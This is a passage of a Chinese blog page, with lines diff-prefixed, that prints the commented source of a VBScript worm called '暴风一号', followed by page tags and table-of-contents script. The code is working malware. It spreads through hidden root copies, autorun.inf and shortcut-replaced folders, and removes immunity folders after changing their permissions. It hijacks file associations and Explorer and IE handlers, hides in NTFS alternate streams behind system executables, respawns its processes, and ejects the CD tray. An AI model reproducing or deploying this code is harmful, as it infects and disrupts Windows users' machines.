+      ImmunityFolder=D&amp;":/Autorun.inf"
+      <br/>
+      If Fso.FolderExists(ImmunityFolder) Then
+      <br/>
+      WshSHell.Run ("CMD /C CACLS "&amp; """"&amp;ImmunityFolder&amp;"""" &amp;" /t /e /c /g everyone:f"),vbHide,True   '//提权
+      <br/>
+      WshSHell.Run ("CMD /C RD /S /Q "&amp; ImmunityFolder), vbHide, True   '//rd命令删除，配合 /s /q 选项，很轻松
+      <br/>
+      End If
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//保护病毒进程 保持脚本进程持续运行，少于2个创建新进程
+      <br/>
+      Sub KeepProcess(VBSFullNames)
+      <br/>
+      On Error Resume Next
+      <br/>
+      For Each VBSFullName in VBSFullNames
+      <br/>
+      If VBSProcessCount(VBSFullName) &lt; 2 then
+      <br/>
+      Run("%SystemRoot%/system/svchost.exe "&amp;VBSFullName)
+      <br/>
+      End If
+      <br/>
+      Next
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//获得系统分区 c:
+      <br/>
+      '//FileSystemObject.GetSpecialFolder 返回指定特殊文件夹
+      <br/>
+      '//WindowsFolder   0   Windows 文件夹，包含 Windows 操作系统安装的文件。
+      <br/>
+      '//SystemFolder    1   System 文件夹，包含库、字体和设备驱动程序文件。
+      <br/>
+      '//TemporaryFolder 2   Temp 文件夹，用于保存临时文件。可以在 TMP 环境变量中找到该文件夹的路径。
+      <br/>
+      '//Left 返回指定数目的从字符串的左边算起的字符。
+      <br/>
+      Function GetSystemDrive()
+      <br/>
+      GetSystemDrive=Left(Fso.GetSpecialFolder(0),2)
+      <br/>
+      End Function
+      <br/>
+      <br/>
+      '//FileSystemObject.GetDrive返回与指定的路径中驱动器相对应的 Drive 对象。Drive 提供对磁盘驱动器或网络共享的属性的访问。
+      <br/>
+      '//Drive.FileSystem返回指定的驱动器使用的文件系统的类型。
+      <br/>
+      Function GetFileSystemType(Drive)
+      <br/>
+      Set d=FSO.GetDrive(Drive)
+      <br/>
+      GetFileSystemType=d.FileSystem
+      <br/>
+      End Function
+      <br/>
+      <br/>
+      '//读取注册表建值 返回所在路径
+      <br/>
+      Function ReadReg(strkey)
+      <br/>
+      Dim tmps
+      <br/>
+      Set tmps=CreateObject("WScript.Shell")
+      <br/>
+      ReadReg=tmps.RegRead(strkey)
+      <br/>
+      Set tmps=Nothing
+      <br/>
+      End Function
+      <br/>
+      <br/>
+      '//重写注册表键值
+      <br/>
+      Sub WriteReg(strkey, Value, vtype)
+      <br/>
+      Dim tmps
+      <br/>
+      Set tmps=CreateObject("WScript.Shell")
+      <br/>
+      If vtype="" Then
+      <br/>
+      tmps.RegWrite strkey, Value
+      <br/>
+      Else
+      <br/>
+      tmps.RegWrite strkey, Value, vtype
+      <br/>
+      End If
+      <br/>
+      Set tmps=Nothing
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//删除注册表键值
+      <br/>
+      Sub DeleteReg(strkey)
+      <br/>
+      Dim tmps
+      <br/>
+      Set tmps=CreateObject("WScript.Shell")
+      <br/>
+      tmps.RegDelete strkey
+      <br/>
+      Set tmps=Nothing
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//设置隐藏属性
+      <br/>
+      Sub SetHiddenAttr(path)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim vf
+      <br/>
+      Set vf=FSO.GetFile(path)
+      <br/>
+      Set vf=FSO.GetFolder(path)
+      <br/>
+      vf.Attributes=6 '// 6=2+4 分别是隐藏、系统属性
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//执行ExeFullName指定的文件
+      <br/>
+      Sub Run(ExeFullName)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim WshShell
+      <br/>
+      Set WshShell=WScript.CreateObject("WScript.Shell")
+      <br/>
+      WshShell.Run ExeFullName
+      <br/>
+      Set WshShell=Nothing
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//感染根目录
+      <br/>
+      Sub InfectRoot(D,VirusName)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim VBSCode
+      <br/>
+      VBSCode=GetCode(WScript.ScriptFullName)
+      <br/>
+      VBSPath=D&amp;":/"&amp;VirusName
+      <br/>
+      If FSO.FileExists(VBSPath)=False Then
+      <br/>
+      Call CreateFile(VBSCode, VBSPath)
+      <br/>
+      Call SetHiddenAttr(VBSPath)
+      <br/>
+      End If
+      <br/>
+      Set Folder=Fso.GetFolder(D&amp;":/")  '//隐藏根目录下的所有子目录
+      <br/>
+      Set SubFolders=Folder.Subfolders
+      <br/>
+      For Each SubFolder In SubFolders
+      <br/>
+      SetHiddenAttr(SubFolder.Path)
+      <br/>
+      LnkPath=D&amp;":/"&amp;SubFolder.Name&amp;".lnk"  '//创建对应的快捷方式
+      <br/>
+      TargetPath=D&amp;":/"&amp;VirusName
+      <br/>
+      Args=""""&amp;D&amp;":/"&amp;SubFolder.Name&amp; "/Dir"""
+      <br/>
+      If Fso.FileExists(LnkPath)=False Or GetTargetPath(LnkPath) &lt;&gt; TargetPath Then
+      <br/>
+      If Fso.FileExists(LnkPath)=True Then
+      <br/>
+      FSO.DeleteFile LnkPath, True
+      <br/>
+      End If
+      <br/>
+      Call CreateShortcut(LnkPath,TargetPath,Args)
+      <br/>
+      End If
+      <br/>
+      Next
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//上一步失败了调用这个函数创建快捷方式
+      <br/>
+      Sub CreateShortcut(LnkPath,TargetPath,Args)
+      <br/>
+      Set Shortcut=WshShell.CreateShortcut(LnkPath)
+      <br/>
+      with Shortcut
+      <br/>
+      .TargetPath=TargetPath
+      <br/>
+      .Arguments=Args
+      <br/>
+      .WindowStyle=4
+      <br/>
+      .IconLocation="%SystemRoot%/System32/Shell32.dll, 3"
+      <br/>
+      .Save
+      <br/>
+      end with
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//创建autorun.inf文件
+      <br/>
+      Sub CreateAutoRun(D,VirusName)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim InfPath, VBSPath, VBSCode
+      <br/>
+      InfPath=D&amp;":/AutoRun.inf"
+      <br/>
+      VBSPath=D&amp;":/"&amp;VirusName
+      <br/>
+      VBSCode=GetCode(WScript.ScriptFullName)
+      <br/>
+      If FSO.FileExists(InfPath)=False Or FSO.FileExists(VBSPath)=False Then
+      <br/>
+      Call CreateFile(VBSCode, VBSPath)
+      <br/>
+      Call SetHiddenAttr(VBSPath)
+      <br/>
+      StrInf="[AutoRun]"&amp;VBCRLF&amp;"Shellexecute=WScript.exe "&amp;VirusName&amp;" ""AutoRun"""&amp;VBCRLF&amp;"shell/open=打开(&amp;O)"&amp;VBCRLF&amp;"shell/open/command=WScript.exe "&amp;VirusName&amp;"
+      <br/>
+      <br/>
+      ""AutoRun"""&amp;VBCRLF&amp;"shell/open/Default=1"&amp; VBCRLF&amp;"shell/explore=资源管理器(&amp;X)"&amp;VBCRLF&amp;"shell/explore/command=WScript.exe "&amp;VirusName&amp;" ""AutoRun"""
+      <br/>
+      Call KillImmunity(D)
+      <br/>
+      Call CreateFile(StrInf, InfPath)
+      <br/>
+      Call SetHiddenAttr(InfPath)
+      <br/>
+      End If
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//改变txt格式文件关联
+      <br/>
+      Sub SetTxtFileAss(sFilePath)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim Value
+      <br/>
+      Value="%SystemRoot%/System32/WScript.exe "&amp;""""&amp;sFilePath&amp;""""&amp;" %1 %* "
+      <br/>
+      Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/txtfile/shell/open/command/", Value, "REG_EXPAND_SZ")
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//改变ini格式文件关联
+      <br/>
+      Sub SetIniFileAss(sFilePath)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim Value
+      <br/>
+      Value="%SystemRoot%/System32/WScript.exe "&amp;""""&amp;sFilePath&amp;""""&amp;" %1 %* "
+      <br/>
+      Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inifile/shell/open/command/", Value, "REG_EXPAND_SZ")
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//改变inf格式文件关联
+      <br/>
+      Sub SetInfFileAss(sFilePath)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim Value
+      <br/>
+      Value="%SystemRoot%/System32/WScript.exe "&amp;""""&amp;sFilePath&amp;""""&amp;" %1 %* "
+      <br/>
+      Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inffile/shell/open/command/", Value, "REG_EXPAND_SZ")
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//改变bat格式文件关联
+      <br/>
+      Sub SetBatFileAss(sFilePath)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim Value
+      <br/>
+      Value="%SystemRoot%/System32/WScript.exe "&amp;""""&amp;sFilePath&amp;""""&amp;" %1 %* "
+      <br/>
+      Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/batfile/shell/open/command/", Value, "REG_EXPAND_SZ")
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//改变cmd格式文件关联
+      <br/>
+      Sub SetCmdFileAss(sFilePath)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim Value
+      <br/>
+      Value="%SystemRoot%/System32/WScript.exe "&amp;""""&amp;sFilePath&amp;""""&amp;" %1 %* "
+      <br/>
+      Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/cmdfile/shell/open/command/", Value, "REG_EXPAND_SZ")
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//改变hlp格式文件关联
+      <br/>
+      Sub SethlpFileAss(sFilePath)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim Value
+      <br/>
+      Value="%SystemRoot%/System32/WScript.exe "&amp;""""&amp;sFilePath&amp;""""&amp;" %1 %* "
+      <br/>
+      Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/hlpfile/shell/open/command/", Value, "REG_EXPAND_SZ")
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//改变reg格式文件关联
+      <br/>
+      Sub SetRegFileAss(sFilePath)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim Value
+      <br/>
+      Value="%SystemRoot%/System32/WScript.exe "&amp;""""&amp;sFilePath&amp;""""&amp;" %1 %* "
+      <br/>
+      Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/regfile/shell/open/command/", Value, "REG_EXPAND_SZ")
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//改变chm格式文件关联
+      <br/>
+      Sub SetchmFileAss(sFilePath)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim Value
+      <br/>
+      Value="%SystemRoot%/System32/WScript.exe "&amp;""""&amp;sFilePath&amp;""""&amp;" %1 %* "
+      <br/>
+      Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/chm.file/shell/open/command/", Value, "REG_EXPAND_SZ")
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//篡改IE启动设置
+      <br/>
+      Sub SetIEAss(sFilePath)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim Value
+      <br/>
+      Value="%SystemRoot%/System32/WScript.exe "&amp;""""&amp;sFilePath&amp;""""&amp;" OIE "
+      <br/>
+      Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/Applications/iexplore.exe/shell/open/command/", Value, "REG_EXPAND_SZ")
+      <br/>
+      Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{871C5380-42A0-1069-A2EA-08002B30309D}/shell/OpenHomePage/Command/", Value, "REG_EXPAND_SZ")
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//改变我的电脑的打开关联，包括Win+E
+      <br/>
+      Sub SetMyComputerAss(sFilePath)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim Value1,Value2
+      <br/>
+      Value1="%SystemRoot%/System32/WScript.exe "&amp;""""&amp;sFilePath&amp;""""&amp;" OMC "
+      <br/>
+      Value2="%SystemRoot%/System32/WScript.exe "&amp;""""&amp;sFilePath&amp;""""&amp;" EMC "
+      <br/>
+      Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/", "", "REG_SZ")
+      <br/>
+      Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/open/command/", Value1, "REG_EXPAND_SZ")
+      <br/>
+      Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/explore/command/", Value2, "REG_EXPAND_SZ")
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//获得系统驱动盘符名 Drive.SerialNumber 盘符序列号 c--&gt;驱动器 C: - 固定&lt;BR&gt;序列号：-1598325125、d--&gt;驱动器 D: - 固定&lt;BR&gt;序列号：237835280、e、f。
+      <br/>
+      Function GetSerialNumber(Drv)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Set d=fso.GetDrive(Drv)
+      <br/>
+      GetSerialNumber=d.SerialNumber '// 返回十进制序列号，用于唯一标识一个磁盘卷。Select Case d.DriveType     Case 0: t = "未知"    Case 1: t = "可移动"    Case 2: t = "固定"
+      <br/>
+      '// Case 3: t = "网络"    Case 4: t = "CD-ROM"    Case 5: t = "RAM 磁盘"      End Select
+      <br/>
+      GetSerialNumber=Replace(GetSerialNumber,"-","")
+      <br/>
+      End Function
+      <br/>
+      <br/>
+      '//获得蠕虫病毒路径   &amp;表示字符串相加  GetSpecialFolder 返回指定的特殊文件夹
+      <br/>
+      Function GetMainVirus(N)
+      <br/>
+      On Error Resume Next
+      <br/>
+      MainVirusName=GetSerialNumber(GetSystemDrive())&amp;".vbs"
+      <br/>
+      If GetFileSystemType(GetSystemDrive())="NTFS" Then
+      <br/>
+      If N=1 Then '//System 文件夹，包含库、字体和设备驱动程序文件。 SystemFolder
+      <br/>
+      GetMainVirus=Fso.GetSpecialFolder(N)&amp;"/smss.exe:"&amp;MainVirusName '//返回 如c:/windows/system32/smss.exe:72161642.vbs
+      <br/>
+      End If
+      <br/>
+      If N=0 Then '//Windows 文件夹，包含 Windows 操作系统安装的文件。 WindowsFolder
+      <br/>
+      GetMainVirus=Fso.GetSpecialFolder(N)&amp;"/explorer.exe:"&amp;MainVirusName '//返回 如c:/windows/explorer.exe:72161642.vbs
+      <br/>
+      End If
+      <br/>
+      Else
+      <br/>
+      GetMainVirus=Fso.GetSpecialFolder(N)&amp;"/"&amp;MainVirusName
+      <br/>
+      End If
+      <br/>
+      End Function
+      <br/>
+      <br/>
+      '//返回指定路径vbs脚本的运行个数
+      <br/>
+      Function VBSProcessCount(VBSPath)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim WMIService, ProcessList, Process
+      <br/>
+      VBSProcessCount=0
+      <br/>
+      Set WMIService=GetObject("winmgmts://./root/cimv2")
+      <br/>
+      Set ProcessList=WMIService.ExecQuery("Select * from Win32_Process Where "&amp;"Name='cscript.exe' or Name='wscript.exe' or Name='svchost.exe'")
+      <br/>
+      For Each Process in ProcessList
+      <br/>
+      If InStr(Process.CommandLine, VBSPath)&gt;0 Then
+      <br/>
+      VBSProcessCount=VBSProcessCount+1
+      <br/>
+      End If
+      <br/>
+      Next
+      <br/>
+      End Function
+      <br/>
+      <br/>
+      '//'用来计数wscript进程的个数，如果大于等于3个那么返回True
+      <br/>
+      Function PreDblInstance()
+      <br/>
+      On Error Resume Next
+      <br/>
+      PreDblInstance=False
+      <br/>
+      If VBSProcessCount(WScript.ScriptFullName)&gt;= 3 Then
+      <br/>
+      PreDblInstance=True
+      <br/>
+      End If
+      <br/>
+      End Function
+      <br/>
+      <br/>
+      '//获取快捷方式的vbs脚本地址
+      <br/>
+      Function GetTargetPath(LnkPath)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim Shortcut
+      <br/>
+      Set Shortcut=WshShell.CreateShortcut(LnkPath)
+      <br/>
+      GetTargetPath=Shortcut.TargetPath
+      <br/>
+      End Function
+      <br/>
+      <br/>
+      '//读取文件 返回 TextStream
+      <br/>
+      Function GetCode(FullPath)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim FileText
+      <br/>
+      Set FileText=FSO.OpenTextFile(FullPath, 1) '//打开指定的文件并返回一个 TextStream 对象，可以读取、写入此对象或将其追加到文件。
+      <span class="Apple-converted-space">
+      </span>
+      <br/>
+      '// 1 以只读模式打开文件。不能对此文件进行写操作。
+      <br/>
+      GetCode=FileText.ReadAll '//读入全部 TextStream 文件并返回结果字符串
+      <br/>
+      FileText.Close
+      <br/>
+      End Function
+      <br/>
+      <br/>
+      '//获得注册表 版本键值 获取windows版本
+      <br/>
+      Function GetVersion()
+      <br/>
+      Dim VerInfo
+      <br/>
+      VerInfo="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Ver"
+      <br/>
+      If ReadReg(VerInfo)="" Then
+      <br/>
+      GetVersion=0
+      <br/>
+      Else
+      <br/>
+      GetVersion=CInt(ReadReg(VerInfo)) '//CInt 返回表达式，此表达式已被转换为 Integer 子类型的 Variant。
+      <br/>
+      End If
+      <br/>
+      End Function
+      <br/>
+      <br/>
+      '//网页文件BFAlert.hta
+      <br/>
+      Sub VirusAlert()
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim HtaPath,HtaCode
+      <br/>
+      HtaPath=Fso.GetSpecialFolder(1)&amp;"/BFAlert.hta"
+      <br/>
+      HtaCode="&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;暴风一号&lt;/TITLE&gt;"&amp;VBCRLF&amp;"&lt;HTA:APPLICATION APPLICATIONNAME=""BoyFine V1.0"" SCROLL=""no"" windowstate=""maximize""
+      <br/>
+      <br/>
+      border=""none"""&amp;VBCRLF&amp;"SINGLEINSTANCE=""yes"" CAPTION=""no"" contextMenu=""no"" ShowInTaskBar=""no"" selection=""no""&gt;"&amp;VBCRLF&amp;"&lt;/HEAD&gt;&lt;BODY bgcolor=#000000&gt;&lt;DIV align
+      <br/>
+      <br/>
+      =""center""&gt;"&amp;VBCRLF&amp;"&lt;font style=""font-size:3500%;font-family:Wingdings;color=red""&gt;N&lt;/font&gt;&lt;BR&gt;"&amp;VBCRLF&amp;"&lt;font style=""font-size:200%;font-family:黑体;color=red""&gt;暴风一号
+      <br/>
+      <br/>
+      &lt;/font&gt;"&amp;VBCRLF&amp;"&lt;/DIV&gt;&lt;/BODY&gt;&lt;/HTML&gt;"
+      <br/>
+      If FSO.FileExists(HtaPath)=False Then
+      <br/>
+      Call CreateFile(HtaCode, HtaPath) '//创建网页文件BFAlert.hta
+      <br/>
+      Call SetHiddenAttr(HtaPath) '//设置隐藏
+      <br/>
+      End If
+      <br/>
+      Call Run(HtaPath)
+      <br/>
+      End Sub
+      <br/>
+      <br/>
+      '//获得感染注册表时间键
+      <br/>
+      Function GetInfectedDate()
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim DateInfo
+      <br/>
+      DateInfo="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Date"
+      <br/>
+      If ReadReg(DateInfo)="" Then
+      <br/>
+      GetInfectedDate=""
+      <br/>
+      Else
+      <br/>
+      GetInfectedDate=CDate(ReadReg(DateInfo))
+      <br/>
+      End If
+      <br/>
+      End Function
+      <br/>
+      <br/>
+      '//弹出光驱
+      <br/>
+      Sub MakeJoke(Times)
+      <br/>
+      On Error Resume Next
+      <br/>
+      Dim WMP, colCDROMs
+      <br/>
+      Set WMP = CreateObject( "WMPlayer.OCX" ) '//创建WMPlayer.OCX插件对象
+      <br/>
+      Set colCDROMs = WMP.cdromCollection '//系统中光驱
+      <br/>
+      If colCDROMs.Count &gt;0 Then
+      <br/>
+      For i=1 to Times
+      <br/>
+      colCDROMs.Item(0).eject() '//退出抽取式设备
+      <br/>
+      WScript.Sleep 3000
+      <br/>
+      colCDROMs.Item(0).eject()
+      <br/>
+      Next
+      <br/>
+      End If
+      <br/>
+      Set WMP = Nothing
+      <br/>
+      End Sub
+      <br/>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   <br/>
+  </p>
+  <p>
+  </p>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   <br/>
+  </p>
+  <p>
+  </p>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   <br/>
+  </p>
+  <p>
+  </p>
+  <p style='font:12px/18px "sans serif", tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;word-spacing:0px;white-space:normal;-ms-word-wrap:break-word;-webkit-text-stroke-width:0px;'>
+   <br/>
+  </p>
+ </div>
+ <div class="flex-v-between">
+  <ul class="d-flex flex-wrap article-tags">
+   <li>
+    标签：
+   </li>
+   <li class="me-2">
+    <a href="https://mrxn.net/tag/%E8%84%9A%E6%9C%AC">
+     <span class="text-muted">
+      #
+     </span>
+     脚本
+    </a>
+   </li>
+   <li class="me-2">
+    <a href="https://mrxn.net/tag/%E7%97%85%E6%AF%92">
+     <span class="text-muted">
+      #
+     </span>
+     病毒
+    </a>
+   </li>
+   <li class="me-2">
+    <a href="https://mrxn.net/tag/windows">
+     <span class="text-muted">
+      #
+     </span>
+     windows
+    </a>
+   </li>
+  </ul>
+ </div>
+ <hr class="my-3"/>
+ <script>
+  // 获取当前脚本所在的父容器
+		const parentContainer = document.currentScript.parentElement;
+		let searchContainer = parentContainer.querySelector('article') || parentContainer;
+
+		if (searchContainer) {
+			// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
+			let images = [];
+			const containers = searchContainer.querySelectorAll('.prose, .markdown');
+			containers.forEach(function(container) {
+				images = images.concat(Array.from(container.querySelectorAll('img')));
+			});
+
+			if (images.length === 0) {
+				images = searchContainer.querySelectorAll('img');
+			}
+
+			images.forEach(function(img) {
+				if (img.getAttribute('data-action') === 'zoom') {
+					const parentLink = img.parentNode;
+					if (parentLink.tagName === 'A') {
+						parentLink.setAttribute('data-fancybox', 'gallery');
+					}
+				} else {
+					const link = document.createElement('a');
+					link.setAttribute('data-fancybox', 'gallery');
+					link.setAttribute('href', img.getAttribute('src'));
+
+					img.parentNode.insertBefore(link, img);
+					link.appendChild(img);
+				}
+			});
+
+			// 初始化 Fancybox
+			Fancybox.bind("[data-fancybox]", {
+				// 您的自定义选项
+			});
+		}
+ </script>
+ <div class="x_nav_toc">
+  <div class="x_toc_header">
+   <span class="x_toc_title">
+    文章目录
+   </span>
+   <button class="x_toc_close">
+    ×
+   </button>
+  </div>
+  <div class="x_toc_content">
+   <ul class="x_anchor-list">
+   </ul>
+  </div>
+ </div>
+ <button class="x_toc_toggle">
+  <svg fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+   <line x1="3" x2="21" y1="12" y2="12">
+   </line>
+   <line x1="3" x2="21" y1="6" y2="6">
+   </line>
+   <line x1="3" x2="21" y1="18" y2="18">
+   </line>
+  </svg>
+ </button>
+ <style type="text/css">
+  .x_nav_toc {
+    position: fixed;
+    top: 0;
+    right: -300px;
+    width: 280px;
+    height: 100%;
+    background-color: white;
+    box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
+    z-index: 1000;
+    transition: right 0.3s ease;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+    padding-top: 10px;
+}
+
+.x_nav_toc.active {
+    right: 0;
+    
+    
+}
+
+
+.x_toc_header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 15px 20px;
+    height: 48px;
+    border-bottom: 1px solid #eee;
+}
+
+.x_toc_title {
+    font-size: 18px;
+    font-weight: bold;
+    color: #333;
+}
+
+.x_toc_close {
+    background: none;
+    border: none;
+    font-size: 24px;
+    cursor: pointer;
+    color: #777;
+    transition: color 0.2s;
+}
+
+.x_toc_close:hover {
+    color: #333;
+}
+
+.x_toc_content {
+    flex: 1;
+    overflow-y: auto;
+    padding: 15px 20px;
+    padding-right: 10px;
+}
+
+.x_anchor-list {
+    list-style-type: none;
+    padding: 0;
+    margin: 0;
+}
+
+/* 减小目录项间距 */
+.x_anchor-list li {
+    margin-bottom: 4px; /* 间距从8px减小到4px */
+}
+
+.x_anchor-list a {
+    text-decoration: none;
+    color: #555;
+    display: block;
+    padding: 6px 10px; /* 减少内边距 */
+    transition: all 0.2s;
+    font-size: 14px;
+    border-radius: 4px;
+    line-height: 1.4; /* 减小行高 */
+}
+
+.x_anchor-list a:hover,
+.x_anchor-list a:focus {
+    background-color: #f8f9fa;
+    color: #0068d6;
+}
+
+
+
+.toc-number {
+    font-weight: 600;
+    margin-right: 8px;
+    color: #495057;
+    display: inline-block;
+    min-width: 25px;
+}
+
+/* 减小各级标题间距 */
+.toc-h1 {
+    font-weight: 600;
+    font-size: 15px;
+    margin-top: 10px; /* 上边距从15px减小到10px */
+    padding-left: 5px !important;
+}
+
+.toc-h2 {
+    font-size: 14px;
+    padding-left: 15px !important; /* 缩进从20px减小到15px */
+}
+
+.toc-h3 {
+    font-size: 13px;
+    padding-left: 25px !important; /* 缩进从30px减小到25px */
+}
+
+.toc-h4 {
+    font-size: 12px;
+    padding-left: 35px !important; /* 缩进从40px减小到35px */
+}
+
+/* 修改后的切换按钮样式 - 使用图标且位置下移 */
+.x_toc_toggle {
+    position: fixed;
+    bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
+    border-radius: 50%;
+    border: none;
+    cursor: pointer;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    z-index: 999;
+    transition: all 0.3s ease;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 0;
+    
+}
+
+.x_toc_toggle svg {
+   width:24px;height:24px;stroke:#3d9bff;
+}
+
+.x_toc_toggle:hover {
+    #background-color: #0081f8;
+    transform: translateY(-3px);
+    box-shadow: 0 6px 15px rgba(0,0,0,0.2);
+}
+
+@media (max-width: 768px) {
+    .x_nav_toc {
+        width: 280px;
+    }
+    .x_toc_toggle {
+        bottom: 100px; /* 手机端也下移位置 */
+        right: 30px;
+        width: 40px;
+        height: 40px;
+    }
+    .x_toc_toggle svg {
+        width: 20px;
+        height: 20px;
+    }
+}
+ </style>
+ <script>
+  document.addEventListener('DOMContentLoaded', function() {
+    // 获取所有标题元素
+    var className = ".line-numbers"; 
+    var selectors = [];
+    for (var i = 1; i <= 6; i++) {
+        selectors.push(className + ' h' + i);
+    }
+    var headings = document.querySelectorAll(selectors.join(', '));
+    
+    // 获取DOM元素
+    var tocContainer = document.querySelector('.x_nav_toc');
+    var toggleButton = document.querySelector('.x_toc_toggle');
+    var tocList = document.querySelector('.x_anchor-list');
+    var closeButton = document.querySelector('.x_toc_close');
+    var currentHighlight = null;
+    
+                
+    // 检测是否为移动设备
+      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    
+    // 如果没有标题，隐藏所有元素
+    if (headings.length === 0) {
+        tocContainer.style.display = 'none';
+        toggleButton.style.display = 'none';
+        return;
+    }
+    
+    // 初始化层级计数器
+    var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
+    var currentLevel = 0;
+    
+    // 生成带数字编号的目录
+    headings.forEach(function(heading, index) {
+        var level = parseInt(heading.tagName[1]);
+        
+        // 更新计数器
+        counters[level - 1] += 1; // 增加当前级别计数器
+        
+        // 重置更低级计数器
+        for (var i = level; i < 6; i++) {
+            counters[i] = 0;
+        }
+        
+        // 生成编号字符串（如"1.2.3"）
+        var numberParts = [];
+        for (var i = 0; i < level; i++) {
+            if (counters[i] > 0) {
+                numberParts.push(counters[i]);
+            }
+        }
+        var numberText = numberParts.join('.')+'.';
+        
+        // 创建唯一ID
+        var id = 'toc-' + numberText.replace(/\./g, '-');
+        heading.id = id;
+        
+        var listItem = document.createElement('li');
+        var anchor = document.createElement('a');
+        var numberSpan = document.createElement('span');
+        
+        numberSpan.className = 'toc-number';
+        numberSpan.textContent = numberText;
+        anchor.appendChild(numberSpan);
+        anchor.innerHTML += heading.textContent;
+        anchor.href = '#' + id;
+        anchor.classList.add('toc-h' + level);
+        
+        listItem.appendChild(anchor);
+        tocList.appendChild(listItem);
+        
+        // 添加点击事件（不关闭目录）
+        anchor.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            
+           
+            // 更新高亮状态
+            if (currentHighlight) {
+                currentHighlight.classList.remove('active');
+            }
+            this.classList.add('active');
+            currentHighlight = this;
+            
+            // 滚动到对应位置
+            var targetId = this.getAttribute('href').substring(1);
+            var targetElement = document.getElementById(targetId);
+            if (targetElement) {
+                var header = document.querySelector("header");
+                var headerHeight = header ? header.offsetHeight : 0;
+                var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
+                var offsetPosition = elementPosition - headerHeight - 20;
+                
+                window.scrollTo({
+                    top: offsetPosition,
+                    behavior: 'smooth'
